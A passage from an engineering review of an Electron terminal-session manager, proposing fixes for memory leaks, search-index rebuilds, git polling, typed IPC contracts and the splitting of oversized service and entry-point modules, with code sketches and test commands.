- **Why:** An unbounded leak proportional to how many sessions are started over a long-running app. Keeping 9 maps consistent by hand is how the exit path got missed.
- **Gain:** Bounded memory, one place to reason about pty lifecycle, and simpler `has()`/`getCwd()`.
- **Implementation steps:**
  1. Introduce `PtyEntry` behind the existing public methods (no API change).
  2. In `onExit`, dispose the screen and drop everything except `cwd` (and `lastDataAt`, which `classifyActivity` treats as 0 anyway when the pty is gone).
  3. In `spawn`, always dispose any old entry under the id.
  4. Add a test: "a pty that exits on its own releases its screen" (assert `screen(id) === ''` after exit), next to the existing kill test.
- **Verification:** `npm test` (`ptyManager.test.ts`, `appService.test.ts` prompt-delivery tests); `npm run test:e2e -- terminal multiTerminal forkSession newSession sessionFollowing activeSection`.
- **Constraints:** Keep "never spawn over a live id" (CLAUDE.md), `whenQuiet` semantics, and `killAll`'s bounded wait.
- **Depends on:** MAIN-5 (simpler if the replay buffer is gone first).

#### MAIN-7: The note index is deleted and rebuilt on every refresh, one transaction per note

- **Category:** performance / correctness
- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - `appService.ts:463-468`: every `updateSearchIndex()`, which every refresh fires (`:311`, so every watcher event), calls `syncNoteIndex()`.
  - `:405-409` does `index.clearNotes()` and then `putNote` per note. `clearNotes` is a bare `DELETE FROM notes` (`searchIndex.ts:173-175`) and each `putNote` is its own transaction (`:143-153`). That is N+1 commits per pass.
  - Between the `DELETE` commit and the re-inserts, the search worker (a separate WAL reader, `searchWorker.ts:17-18`) can observe an empty notes table, so a note search can briefly return nothing.
- **What:** Notes are kept in step at write time already (`setSessionNote`, `:418-429`). Do the full resync only when note indexing is switched on (`setSearchSessionNotes`) and on "Rebuild index". If a safety net on each pass is wanted, make it one transaction that diffs (`SearchIndex.replaceNotes(entries)` inside `db.transaction`) rather than clearing and reinserting.
- **Why:** Needless write amplification on every watcher event, and a visible-empty window for concurrent note searches.
- **Gain:** Zero note writes per ordinary pass; atomic when a resync does run.
- **Implementation steps:**
  1. Add `SearchIndex.replaceNotes(entries)` inside one transaction.
  2. Use it in `syncNoteIndex`.
  3. Remove the per-pass call at `:466-468`, or gate it behind a `notesDirty` flag set by `setSearchSessionNotes(true)`.
- **Verification:** `npm test` (`searchIndex.test.ts`, the notes cases in `appService.test.ts`); `npm run test:e2e -- sessionNotes search`.
- **Constraints:** CLAUDE.md Search: notes live in their own FTS table, are searchable the instant they are saved, and turning note indexing off empties that table.
- **Depends on:** none.

#### MAIN-8: "Rebuild index" silently does nothing but clear while a pass is running

- **Category:** correctness
- **Severity:** low
- **Effort:** S
- **Evidence:** `rebuildSearchIndex` (`appService.ts:437-444`) calls `index().clear()` and then `await this.updateSearchIndex()`. That returns immediately if `this.indexing` is already true (`:469`). The in-flight pass has already walked past some sessions, so those stay missing from the index until the next pass. `ApiaryApi.searchRebuild` promises "resolves when the pass has finished" (`api.ts:484`).
- **What:** Track the running pass as a promise (`private indexPass: Promise<void> | null`). `rebuildSearchIndex` sets a stop flag, awaits the running pass, clears, and then starts and awaits a fresh one.
- **Why:** The Settings count and search results lie after a rebuild clicked during background indexing.
- **Gain:** Rebuild means rebuild.
- **Implementation steps:**
  1. Replace the `indexing` boolean with `indexPass` plus a `restart` flag.
  2. Make `shouldStop` also check the flag.
  3. Add a test: "rebuilding during a pass re-indexes every session".
- **Verification:** `npm test` (`appService.test.ts`, `searchIndex.test.ts`); `npm run test:e2e -- search settings`.
- **Constraints:** Indexing stays on the main thread, yielding between files.
- **Depends on:** none.

#### MAIN-9: Git status polling runs 4 sequential git processes per pane every 5 s, and "not a repo" is an exception every poll

- **Category:** performance / error-handling
- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - The renderer polls `gitStatus` every 5 s per `SessionColumn` while focused (`SessionColumn.tsx:170-177`), so up to 4 panes. `branchOps.status` (`branchOps.ts:37-50`) runs `rev-parse --git-dir`, `rev-parse --abbrev-ref HEAD`, `rev-parse … @{u}` and `rev-list --left-right --count` sequentially: 4 spawns. With 4 panes that is about 3.2 git spawns per second, with no sharing when two panes show the same folder.
  - For a non-repository folder, `status` throws (`:39`). `ipc.ts:91` then logs `handler failed` every 5 s per pane, and the renderer's `.catch(() => setGitStatus(null))` swallows it. The comment at `ipc.ts:86-90` acknowledges this as an expected failure, which is really an outcome.
- **What:**
  - Collapse to 2 spawns: `git symbolic-ref -q --short HEAD` (branch or detached), then `git for-each-ref --format='%(upstream:short)%09%(upstream:track,nobracket)' refs/heads/<branch>`, which gives the upstream plus "ahead N, behind M" in one call. Skip the second when detached.
  - Add a per-cwd single-flight plus a ~1 s memo in main, so concurrent pollers for the same folder share one result.
  - Return `GitStatus | null` for "not a repository", following the `CheckoutOutcome` precedent, instead of rejecting.
- **Why:** Constant background process churn on the thread that routes input, and a diagnostic log filled with non-errors.
- **Gain:** About 50% fewer spawns per poll, dedupe across panes, and a quieter log.
- **Implementation steps:**
  1. Rewrite `status()` with the two calls. Keep the same `GitStatus` shape.
  2. Add a `singleFlight(cwd)` helper in the git service.
  3. Change the `gitStatus` return type to `GitStatus | null` in `ApiaryApi`, the preload, `fakeApiary.ts` and `SessionColumn.tsx`.
- **Verification:** `npm test` (`branchOps.test.ts`: upstream / no upstream / detached / not-a-repo cases); `npm run test:component`; `npm run test:e2e -- gitToolbar sidebarBranch`.
- **Constraints:** No network in the poll (`SessionColumn.tsx:165-167`). Git prose is still not parsed; `%(upstream:track)` is a format atom, not prose.
- **Depends on:** easier after MAIN-11 for the contract change.

#### MAIN-10: Synchronous filesystem work on hot IPC paths

- **Category:** performance
- **Severity:** low
- **Effort:** S
- **Evidence:**
  - `tree()` passes `(path) => existsSync(path)` (`appService.ts:319`), and `buildTree` calls it **once per session**, not per distinct cwd (`buildTree.ts:20`). Every window calls `tree()` on every `treeChanged`, which fires after every watcher pass (`ipc.ts:683`) and every index update (`index.ts:441-445`).
  - `sessionNote(id)` loads and maps **every session row** to find one: `this.store.allSessions().find(...)` (`appService.ts:433`).
  - `persistBounds` does a synchronous `loadSettings` (read + parse), then `saveSettings` (write), on every `moved`/`resized` (`index.ts:227-234`). It even reads the file for windows that are not first and will never write. Electron documents `moved` on macOS as an alias of `move`, so this can fire continuously during a drag.
- **What:**
  - Memoise `cwdExists` per distinct path inside `tree()` (`const seen = new Map<string, boolean>()`).
  - Use `store.getSession(id)?.note ?? ''`.
  - Debounce `persistBounds` (e.g. 300 ms trailing) and keep settings in memory (MAIN-16).
- **Why:** Cheap fixes that remove per-session and per-event synchronous I/O from the main thread.
- **Gain:** `tree()` goes from S stats to D stats (distinct cwds); O(1) note lookup; one settings write per drag.
- **Implementation steps:** three local edits as described. Put the memo in `AppService.tree()` so `buildTree` stays pure.
- **Verification:** `npm test` (`buildTree.test.ts`, `appService.test.ts`); `npm run test:e2e -- sidebar sessionNotes restoreWindows multiWindow`.
- **Constraints:** Only the first window writes `windowBounds` (`index.ts:222-225`).
- **Depends on:** MAIN-16 for the in-memory settings part.

#### MAIN-11: The IPC contract is written four times by hand; make one typed channel map the source of truth

**Lead review:** This registrar also delivers SEC-8 steps 1, 3, 4, 7 and 8, and MAIN-19 item 4.

- **Category:** ipc
- **Severity:** high
- **Effort:** M (introduce), then S per domain
- **Evidence:**
  - There are **99 channels** (`api.ts:170-270`). The preload has 74 `ipcRenderer.invoke`, 7 `ipcRenderer.send`, 17 `subscribe` and 1 `sendSync` lines (`preload/index.ts:13-123`), each a hand-written line like `gitCheckoutRemote: (key, isPtyId, remoteRef, localName) => ipcRenderer.invoke(CHANNELS.gitCheckoutRemote, key, isPtyId, remoteRef, localName)`.
  - Main has 66 `handle(...)` and 6 `ipcMain.on` in `ipc.ts`, plus 10 more in `themeIpc.ts`.
  - The main side is **not type-linked** to `ApiaryApi`. `type Handler = Parameters<typeof ipcMain.handle>[1]` (`ipc.ts:70`) accepts `any[]`, so `handle(CHANNELS.gitStatus, (_e, key: string, isPtyId: boolean) => …)` is an unchecked claim. Adding a parameter to `ApiaryApi.gitCreateBranch` would compile with `ipc.ts` untouched.
  - Shapes drift: `reportTabs`' tab type is written inline three times (`api.ts:318`, `ipc.ts:146`, `tabRegistry.ts:5-16`).
  - A missing handler is a runtime "No handler registered" error, not a type error.
  - Runtime validation is ad hoc: themes validate `unknown` args (`themeIpc.ts:45-78`) and tabs use `isTabTransfer` (`ipc.ts:592,623,631`), while ~70 other handlers trust their declared types (e.g. `ptyRunning` does `ids.filter` on whatever arrives, `ipc.ts:534`).
  - Events are untyped on the send side: `send = (channel: string, ...args: unknown[])` (`ipc.ts:106`).
  - Adding one invoke today means editing 6 places: `CHANNELS`, `ApiaryApi`, the preload, the `ipc.ts` handler, the `AppService` method and `fakeApiary.ts`. Three of those are pure boilerplate.
- **What:** One declarative contract in `src/shared/ipc/contract.ts`, from which the renderer type, the preload bridge, the main registrar (compile-time complete) and the typed emitter are all derived. It keeps the **exact channel strings** and **positional arguments**, because the e2e harness stubs `ipcMain.handle('apiary:transcript', (event, id, beforeIndex) => …)` and listens on `'apiary:pty-kill'`/`'apiary:pty-resize'` (`tests/e2e/helpers.ts:472-486,523,545`), and `describeError` strips `Error invoking remote method 'apiary:…'` (`renderer/errors.ts:12`).

  ```ts
  // src/shared/ipc/guards.ts: tiny, dependency-free, same style as isTabTransfer
  export type Guard<T> = (v: unknown) => v is T
  export const str: Guard<string> = (v): v is string => typeof v === 'string'
  export const bool: Guard<boolean> = (v): v is boolean => typeof v === 'boolean'
  export const num: Guard<number> = (v): v is number => typeof v === 'number' && Number.isFinite(v)
  export const opt = <T>(g: Guard<T>): Guard<T | undefined> => (v): v is T | undefined => v === undefined || g(v)
  export const arr = <T>(g: Guard<T>): Guard<T[]> => (v): v is T[] => Array.isArray(v) && v.every(g)
  export const tuple = <G extends Guard<unknown>[]>(...gs: G) =>
    (v: unknown): v is { [K in keyof G]: G[K] extends Guard<infer T> ? T : never } =>
      Array.isArray(v) && v.length <= gs.length && gs.every((g, i) => g(v[i]))

  // src/shared/ipc/contract.ts
  interface Invoke<A extends unknown[], R> { kind: 'invoke'; channel: string; args: Guard<A>; _r?: R }
  interface Send<A extends unknown[]>      { kind: 'send';   channel: string; args: Guard<A> }
  interface Event<P extends unknown[]>     { kind: 'event';  channel: string; _p?: P }
  interface Sync<R>                        { kind: 'sync';   channel: string; _r?: R }
  const invoke = <A extends unknown[], R>(channel: string, args: Guard<A>): Invoke<A, R> => ({ kind: 'invoke', channel, args })
  const send   = <A extends unknown[]>(channel: string, args: Guard<A>): Send<A> => ({ kind: 'send', channel, args })
  const event  = <P extends unknown[] = []>(channel: string): Event<P> => ({ kind: 'event', channel })

  export const IPC = {
    /** Rescans ~/.claude/projects … (doc comment moves here from ApiaryApi) */
    refresh:      invoke<[], void>('apiary:refresh', tuple()),
    transcript:   invoke<[sessionId: string, beforeIndex?: number], TranscriptPage>('apiary:transcript', tuple(str, opt(num))),
    gitStatus:    invoke<[key: string, isPtyId: boolean], GitStatus>('apiary:git-status', tuple(str, bool)),
    reportTabs:   send<[tabs: ReportedTab[]]>('apiary:report-tabs', tuple(arr(isReportedTab))),
    ptyWrite:     send<[id: string, data: string]>('apiary:pty-write', tuple(str, str)),
    treeChanged:  event('apiary:tree-changed'),
    ptyData:      event<[id: string, data: string]>('apiary:pty-data'),
    themeInitial: { kind: 'sync', channel: 'apiary:theme-initial' } as Sync<ThemeState>,
    // … all 99
  } as const

  type Spec = typeof IPC
  export type InvokeKey = { [K in keyof Spec]: Spec[K] extends Invoke<any, any> ? K : never }[keyof Spec]
  export type EventKey  = { [K in keyof Spec]: Spec[K] extends Event<any> ? K : never }[keyof Spec]
  export type ArgsOf<K>    = Spec[K] extends Invoke<infer A, any> | Send<infer A> ? A : never
  export type ResultOf<K>  = Spec[K] extends Invoke<any, infer R> ? R : never
  export type PayloadOf<K> = Spec[K] extends Event<infer P> ? P : never

  /** What window.apiary is: derived, so it can never disagree with main. */
  export type ApiaryApi =
    { [K in InvokeKey]: (...a: ArgsOf<K>) => Promise<ResultOf<K>> }
    & { [K in SendKey]: (...a: ArgsOf<K>) => void }
    & { [K in EventKey as `on${Capitalize<K & string>}`]: (cb: (...p: PayloadOf<K>) => void) => () => void }
    & { initialTheme: ThemeState }

  /** Kept for e2e/tests and existing imports: identical strings. */
  export const CHANNELS = Object.fromEntries(Object.entries(IPC).map(([k, s]) => [k, s.channel])) as { [K in keyof Spec]: Spec[K]['channel'] }
  ```

  ```ts
  // src/preload/index.ts: ~20 lines instead of 125
  const api = {} as Record<string, unknown>
  for (const [key, spec] of Object.entries(IPC)) {
    if (spec.kind === 'invoke') api[key] = (...a: unknown[]) => ipcRenderer.invoke(spec.channel, ...a)
    else if (spec.kind === 'send') api[key] = (...a: unknown[]) => { ipcRenderer.send(spec.channel, ...a) }
    else if (spec.kind === 'event') api[`on${key[0].toUpperCase()}${key.slice(1)}`] = (cb: (...a: unknown[]) => void) => subscribe(spec.channel, cb)
  }
  api.initialTheme = ipcRenderer.sendSync(IPC.themeInitial.channel)
  contextBridge.exposeInMainWorld('apiary', api as ApiaryApi)
  ```

  ```ts
  // src/main/ipc/registrar.ts
  export type Handlers = { [K in InvokeKey]: (e: IpcMainInvokeEvent, ...a: ArgsOf<K>) => ResultOf<K> | Promise<ResultOf<K>> }
  export type Listeners = { [K in SendKey]: (e: IpcMainEvent, ...a: ArgsOf<K>) => void }
  export function registerAll(h: Handlers, l: Listeners): () => void {
    for (const key of Object.keys(h) as InvokeKey[]) {
      const spec = IPC[key]
      ipcMain.handle(spec.channel, async (event, ...raw: unknown[]) => {
        if (!spec.args(raw)) { log.warn('ipc', 'rejected arguments', { channel: spec.channel }); throw new Error('Invalid request.') }
        /* existing timing + warn logging from ipc.ts:73-95 */
        return (h[key] as (...x: unknown[]) => unknown)(event, ...raw)
      })
    }
    // same for listeners, wrapped in try/catch + log (today's ipcMain.on handlers are unwrapped: MAIN-19)
    return () => { /* removeHandler/removeAllListeners per channel */ }
  }
  // Each domain module exports a Pick<Handlers, …>; the composition does
  // registerAll({ ...sessionHandlers, ...gitHandlers, ...ptyHandlers, ... } satisfies Handlers, …)
  // so a channel with no handler is a compile error.

  // src/main/windows/emit.ts
  export function emit<K extends EventKey>(key: K, ...payload: PayloadOf<K>): void   // all windows
  export function emitTo<K extends EventKey>(win: WebContents, key: K, ...payload: PayloadOf<K>): void
  ```

  Runtime validation sits in the registrar, so it cannot be forgotten, the same argument CLAUDE.md makes for redaction inside the logger. `settingsSet`'s guard must accept a *partial* object ("treat a missing field as unchanged", CLAUDE.md "Settings arriving over IPC").
- **Why:** Removes three hand-maintained copies and makes the main side compile-time checked against the renderer's view. Every handler gets boundary validation and logging. Adding a channel becomes: one contract entry plus one handler plus the fake (the fake stays typed as `ApiaryApi`, so it still breaks when something is missing, as CLAUDE.md requires).
- **Gain:** A new invoke goes from 6 edits (3 of them boilerplate) to 3, with type-checked arguments end to end. The preload shrinks from 125 lines to about 25. `theme` channels join the same logging.
- **Implementation steps** (each keeps all tests green):
  1. Add `shared/ipc/guards.ts` and `shared/ipc/contract.ts` covering all 99 channels, with types copied from `ApiaryApi`. Derive `CHANNELS` from it and re-export it from `shared/api.ts`. Add a type-level test (`tests/unit/ipcContract.test.ts`) that derived `ApiaryApi` equals the existing hand-written interface (`expectTypeOf<Derived>().toEqualTypeOf<ApiaryApi>()`) and that every channel string is unchanged (snapshot the `CHANNELS` object).
  2. Switch `shared/api.ts` to `export type { ApiaryApi } from './ipc/contract'`, moving the doc comments onto the contract entries. `fakeApiary.ts` then type-checks against the derived type.
  3. Replace the preload body with the generated bridge. Keep `initialTheme` as the one special sync entry.
  4. Introduce `registerAll`/typed `handle` in main. Convert `ipc.ts` handlers in place, one domain per commit (sessions, git, pty, settings, update, tabs, log), then `themeIpc.ts`. Start with permissive guards (`tuple` of the declared primitive types), then tighten.
  5. Replace the 6 broadcast loops and 5 `mainWindow` sends with `emit`/`emitTo` (MAIN-12).
  6. Delete the old `Handler` type and the hand-written interface.
- **Verification:** `npm run typecheck`; `npm test` (new contract test); `npm run test:component` (fake still satisfies the type); full `npm run test:e2e` (channel strings and positional args unchanged; `helpers.ts` stubs still work); `npm run lint` (the ESLint area rules still hold: `shared/ipc/*` imports neither side).
- **Constraints:**
  - Channel strings and positional argument order must not change (e2e helpers, `describeError`).
  - `CLAUDE.md` line 13-14 ("A new IPC call means touching…") must be updated.
  - The renderer still reaches main only through `window.apiary`. The preload is sandboxed (`index.ts:199`), so the contract module must stay pure data plus guards (no Node imports).
  - Settings payload semantics (missing = unchanged) are preserved.
- **Depends on:** none. MAIN-12, MAIN-13, MAIN-19, MAIN-21 and MAIN-22 build on it.

#### MAIN-12: Main→renderer events are sent by six hand-rolled broadcast loops, and some go only to the focused window

- **Category:** ipc / correctness
- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - The "for every non-destroyed window" loop is written 6 times: `ipc.ts:106-110`, `ipc.ts:557-562`, `index.ts:379-381`, `index.ts:437-439`, `index.ts:442-444`, `themeIpc.ts:24-29`.
  - The periodic rescan and the menu's **Rescan Sessions** send `treeChanged` **only to `mainWindow`**: `index.ts:81` and `index.ts:495` (`mainWindow?.webContents.send(CHANNELS.treeChanged)`). The watcher broadcasts to all windows (`ipc.ts:683`). So after Cmd+R or an auto-import pass, background windows keep a stale tree.
  - The menu's rescan also skips `invalidateMrStatuses()`, which the Refresh button does (`ipc.ts:113-117`), so the two "rescan" routes mean different things.
- **What:** One `WindowManager.emit(key, ...payload)` (typed by MAIN-11) and one `emitTo(webContents, …)`. Route every "refresh then tell the UI" path through one function, `sessionsController.rescan({ reason })`, which invalidates MR statuses and emits to all windows.
- **Why:** This bug class (only the front window hears) is already present, and the next event added will face the same choice.
- **Gain:** Consistent multi-window behaviour and a single place to add, say, per-window filtering (MAIN-26).
- **Implementation steps:**
  1. Add `broadcast(channel, ...args)` in a new `main/windows/broadcast.ts`. Replace the 6 loops.
  2. Change `index.ts:81,495` to broadcast.
  3. Extract `rescan(reason)` used by the IPC `refresh`, the menu, the periodic timer and the watcher.
  4. Retype the functions with `EventKey` once MAIN-11 lands.
- **Verification:** New e2e test in `multiWindow.spec.ts`: "a rescan from the menu updates every window's sidebar". `npm run test:e2e -- multiWindow mrStatus themes update`.
- **Constraints:** Broadcasting to all windows is deliberate (`ipc.ts:97-105`). Keep `onNewSessionStarted`/`openImportDialog`/`openSettingsDialog`/`toggleSidebar` targeted at the front window: those are UI commands, not state.
- **Depends on:** none (typing via MAIN-11).

#### MAIN-13: `ipc.ts` is a second service layer: split it into a registrar plus thin per-domain handler modules

**Lead review:** Target folders: §3.2 (reconciled with STRUCT-2).

- **Category:** modularity
- **Severity:** high
- **Effort:** M
- **Evidence:** `registerIpc` has 11 positional parameters, 7 optional, one unused (`getWindow`, `ipc.ts:36`, never read). Beyond wiring, it owns:
  - (a) the settings merge and apply fan-out (`:236-321`, 85 lines of settings domain logic);
  - (b) construction and lifetime of `ClaudeSessionTracker` (`:504-513`) and the chokidar watcher (`:673-686`);
  - (c) the activity broadcast coalescer (`:657-671`);
  - (d) cross-window tab moves: focus-order tracking, hit-testing, hand-over and claim announcements (`:546-638`);
  - (e) the updater fallback object (`:462-476`);
  - (f) post-mutation refresh policy (MAIN-4);
  - (g) DTO mapping (`:122-130`, `:152-164`);
  - (h) URL allow-listing for plugin actions (`:419-437`).

  It reaches into `service.pty.*` 17 times.
- **What:** Target layout (dependency direction: `ipc/handlers/*` → services → leaves; services never import `ipc/` or `electron` except `windows/*` and `app/*`):

  ```text
  src/main/ipc/
    registrar.ts            // registerAll(), typed handle/on wrappers, logging, validation (MAIN-11)
    handlers/sessions.ts    // tree, discovered, import, transcript, rename, remove, move, notes, search
    handlers/terminals.ts   // resume, fork, newSession*, openShell*, pty*, sendPrompt, renameTerminalInClaude
    handlers/git.ts         // git*, listWorktrees, gitlabMrRefStatus
    handlers/settings.ts    // settingsGet/Set → SettingsService (MAIN-16)
    handlers/tabs.ts        // reportLayout, reportTabs, activeTabs, focusTab, tabDropped/Detach/AdoptHere → TabMover
    handlers/plugins.ts, handlers/update.ts, handlers/log.ts, handlers/theme.ts (moved from themeIpc.ts)
  src/main/sessions/sessionWatcher.ts     // chokidar + debounce + periodic timer (from ipc.ts and index.ts)
  src/main/terminals/activityBroadcaster.ts
  src/main/windows/tabMover.ts            // focusOrder, windowUnder, handOver, announceClaimed
  ```

  Each handler file exports `(deps) => Pick<Handlers, …>` and is a thin adapter: parse, call a service, map the DTO. The composition root builds the deps object once.
- **Why:** The IPC layer should be replaceable and boring. Today, testing the settings merge, the watcher debounce or the tab-move decision requires Electron's `ipcMain`, so none of them has a unit test. `tests/unit` has `windowAtPoint` but nothing for `handOver`/`announceClaimed`, and nothing for the settings merge.
- **Gain:** Handler files of about 50-100 lines each. Settings merge, watcher and tab-move logic become unit-testable in Node. The `registerIpc` signature collapses to `registerIpc(deps: IpcDeps)`.
- **Implementation steps:**
  1. Change the signature to `registerIpc(deps: { service, configRoot, settingsFile, updater, sessionLayoutStore, layoutFlushCoordinator, openDetachedWindow, tabRegistry, windowNumberFor, onAutoImportIntervalChange })` and drop `getWindow`. Mechanical, one commit.
  2. Extract `SessionWatcher` (constructor `{ dir, onChange }`, `start()`, `dispose()`) and move the periodic timer from `index.ts:59-86` into it.
  3. Extract `ActivityBroadcaster` (`{ pty, tabRegistry, emit }`) and `TabMover` (`{ windows, tabRegistry, pty, openDetachedWindow, windowNumberFor }`), with unit tests using fake windows.
  4. Move the settings merge into `SettingsService.applyPayload` (MAIN-16).
  5. Split the remaining handlers into `ipc/handlers/*.ts`, one domain per commit. Fold `themeIpc.ts` into `handlers/theme.ts`.
- **Verification:** `npm run typecheck`, `npm test` (new unit tests for watcher debounce, activity coalescing and tab moves), `npm run test:component`, full `npm run test:e2e` after each step (especially `detachTab multiWindow activeSection settings`).
- **Constraints:**
  - CLAUDE.md: activity status is computed fresh at `activeTabs` time, not cached.
  - The leading-edge-plus-trailing coalescing semantics (`ipc.ts:652-656`) must be kept.
  - Cross-window drops are decided by geometry in main.
  - The layout flush coordinator must still be notified from `reportLayout`.
- **Depends on:** MAIN-11 (can start without it: step 1 does not need it).

#### MAIN-14: `AppService` is a god object and a hidden composition root: split it into cohesive services behind a temporary facade

**Lead review:** Step 1 is the same seam as TEST-6's `AppService` part. Target folders: §3.2.

- **Category:** modularity
- **Severity:** high
- **Effort:** L (in S steps)
- **Evidence:**
  - 1,103 lines; 57 public methods (14 of them `git*` one-line delegations such as `appService.ts:819-886`); 12 private.
  - It constructs its own collaborators, so nothing can be injected: `readonly pty = new PtyManager()` (`:91`), `new SessionStore(options.dbPath)` (`:117`), `new PluginRegistry(...)` plus the hardcoded `createGitLabMrPlugin` (`:123-127`), `new SearchClient(...)` (`:339`).
  - Its options bag mixes domains: prompt shims, glab path, VS Code path, search toggles, plugin maps (`:34-66`).
  - Settings mutators are a grab-bag: `setClaudeBin`, `setAutoImportAll`, `setSearchChatContent`, `setSearchSessionNotes`, `setPromptPath`, `setPluginEnabled`, `setPluginSettings`.
  - The trust boundary (`resolveShellCwd` `:655-660`, `requireFolder` `:854-859`, `requireSession` `:971-975`, `listedWorktrees` `:171`) is shared by the git, shell, plugin and VS Code paths, which is why everything lives in one class.
- **What:** Extract services along the seams already visible in the file, keeping `AppService` as a facade that delegates, so the 1,205-line `tests/integration/appService.test.ts` keeps passing unchanged until the end:

  ```text
  sessions/sessionResolver.ts   // requireSession, requireFolder, resolveCwd(ref: TerminalRef), listedWorktrees; the trust boundary, one file
  sessions/sessionCatalog.ts    // refresh loop, live map, tree(), discovered(), import*, sessionIsResumable; emits 'changed'
  sessions/sessionActions.ts    // rename, note, remove, move (uses catalog + search for notes)
  search/searchService.ts       // index/client lifecycle, note sync, rebuild, counts, updateSearchIndex
  terminals/terminalService.ts  // resume, fork, newSession*, openShell*, sendPrompt, promptEnv, claudeBin; owns no PtyManager (injected)
  git/gitService.ts             // all git* + gitlabMrRefStatus + refreshProject (MAIN-4); uses resolver
  plugins/pluginService.ts      // registry + context (needs resolver + lastBranch from gitService)
  media/imageStore.ts           // saveImage/readImage (confined dir)
  integrations/vscode.ts        // vsCodeAvailable/openInVsCode
  ```

  Dependencies are passed in through constructors: `new TerminalService({ pty, resolver, settings })`. `PtyManager`, `SessionStore` and `PluginRegistry` are built once in the composition root (MAIN-15).
- **Why:** Every feature touches this file. Its constructor makes fakes impossible, which is why `appService.test.ts` spawns real ptys and real git. The settings mutators exist only because settings have no owner (MAIN-16).
- **Gain:** Files of about 100-250 lines each with one reason to change. Services can be tested with injected fakes. The trust boundary is concentrated in one reviewed file.
- **Implementation steps** (each step is one PR that keeps all tests green):
  1. Change `AppService` to accept optional injected `pty`, `store` and `plugins` in `AppServiceOptions`, defaulting to today's constructions.
  2. Extract `SessionResolver` (pure move of the 3 `require*` methods plus `listedWorktrees`). `AppService` holds one and delegates.
  3. Extract `GitService` (moves the 14 git methods and `gitlabMrRefStatus`). `AppService.gitX` becomes a one-line delegate.
  4. Extract `SearchService`, then `TerminalService`, then `ImageStore`/VS Code, then `SessionCatalog`/`SessionActions`, each with delegates left behind.
  5. Point the IPC handlers (MAIN-13) at the services directly.
  6. Split `appService.test.ts` by service, then delete the facade methods that have no callers left. Keep `AppService` only as `createServices(options)`, or remove it.
- **Verification:** After every step: `npm run typecheck`, `npm test` (`appService.test.ts` unchanged until step 6), `npm run test:component`, `npm run test:e2e:smoke`. Full `npm run test:e2e` at steps 3, 4 and 6.
- **Constraints:**
  - "The renderer never supplies a filesystem path": every service must go through `SessionResolver`.
  - `resume()`/`openShell()` attach instead of spawning over a live id.
  - `dispose()` ordering: set disposed → kill ptys → await refresh → close store → close index (`:991-1007`).
  - `sendPrompt`'s two waits (CLAUDE.md "Terminals and PTYs").
- **Depends on:** MAIN-15 for the root; benefits from MAIN-16 and MAIN-21.

#### MAIN-15: Make the composition root explicit; move window management and test overrides out of `index.ts`

**Lead review:** Step 1 (`app/env.ts`) should carry SEC-3's packaged-build gate.

- **Category:** modularity
- **Severity:** medium
- **Effort:** M
- **Evidence:**
  - `index.ts` mixes the Electron lifecycle with window geometry (`:133-288`), a window registry (`:44-56`, `:215-220`, `:236-256`), updater construction including a fake backend (`:319-384`), the periodic rescan timer (`:59-86`), menu wiring (`:491-509`), restore (`:476-490`) and shutdown (`:525-593`).
  - Test overrides are read inline at scattered points: `APIARY_CONFIG_ROOT`/`APIARY_DB_PATH`/`APIARY_FAKE_LIVE` at `:389-391`, `APIARY_CODE_PATH` at `:413`, `APIARY_GLAB_PATH` at `:434`, `APIARY_DEFAULT_THEME` at `:457`, `APIARY_SAFE_THEME` at `:453`, `APIARY_FAKE_UPDATE(_MODE)` at `:323-328`, `APIARY_HEADLESS` at `:113`.
  - About 12 mutable module globals. `service!` non-null assertion at `:478`.
- **What:**

  ```text
  src/main/app/env.ts        // parseRuntimeEnv(process.env, argv) -> { configRoot, dbPath, fakeLive, codePath, glabPath, defaultTheme, safeTheme, fakeUpdate, headless }
  src/main/app/container.ts  // createContainer(env, paths) -> { settings, store, pty, services..., updater, themes, layoutStore, tabs, windows }; pure construction, no side effects
  src/main/app/lifecycle.ts  // whenReady / activate / window-all-closed / before-quit wiring; shutdown(container)
  src/main/windows/windowManager.ts  // create(opts), numbering, webContents↔number, front window, broadcast/emit, focus order (shared with TabMover)
  src/main/update/createUpdater.ts   // moved from index.ts, with the fake backend in update/fakeBackend.ts
  src/main/index.ts          // ~30 lines: const env = parseRuntimeEnv(); app.whenReady().then(() => start(env)).catch(fatal)
  ```

- **Why:** The test-only switches are the app's test API, and today they are only discoverable by grepping. Window management is shared state that `ipc.ts` currently reconstructs (its own `focusOrder`, `ipc.ts:547-554`, while `index.ts:220` tracks `mainWindow`).
- **Gain:** One place that lists every dependency and every test switch. `WindowManager` becomes the single owner of window identity (fixes the duplicate focus tracking). Startup and shutdown order are readable top to bottom.
- **Implementation steps:**
  1. Move env parsing into `app/env.ts` (pure, unit-tested).
  2. Move `createUpdater` into `update/createUpdater.ts`.
  3. Extract `WindowManager` (create, numbering, maps, front window, `broadcast`), used by `index.ts` and passed to `registerIpc` in place of `windowNumberFor`/`openDetachedWindow`.
  4. Extract `shutdown(container)` into `app/lifecycle.ts`, keeping its exact order.
  5. Introduce `createContainer` last, once services exist (MAIN-14).
- **Verification:** `npm test` (new `env.test.ts`); full `npm run test:e2e` (`appBoots restoreWindows multiWindow detachTab update themes`); manual `npm start` sanity by the maintainer.
- **Constraints:**
  - Deferred-quit semantics, including `shutdownFinished` and second-quit handling (`index.ts:527-550`).
  - `closed`-before-`before-quit` layout preservation (`:236-252`).
  - The detached-window key and transfer travel in the URL (CLAUDE.md).
  - The theme is read synchronously before first paint.
- **Depends on:** MAIN-12 (broadcast), partially MAIN-14.

#### MAIN-16: Settings have no owner: the file is re-read about 10 times, written non-atomically, and each new field is enumerated by hand in three places

**Lead review:** Re-verified the non-atomic write (`settings.ts:195`). Do TEST-4 step 1 (extract and unit-test the merge) before steps 2-5.

- **Category:** extensibility / correctness
- **Severity:** medium
- **Effort:** M
- **Evidence:**
  - `loadSettings(settingsFile)` is called at `ipc.ts:212, 237, 490` and `index.ts:140, 228, 345, 373, 397`. The updater calls `readUpdateSettings` (a file read) on every `settings()` access (`index.ts:344-353`).
  - A new setting must be added to `AppSettings` + `DEFAULT_SETTINGS` (`settings.ts`), to `AppSettingsPayload` (`api.ts:24-64`, a hand-duplicated subset), to the `settingsGet` literal (`ipc.ts:213-234`), to the `settingsSet` merge literal (`ipc.ts:250-280`) and to the apply fan-out (`ipc.ts:284-320`), and often to `AppServiceOptions` plus `index.ts:417-449` for startup.
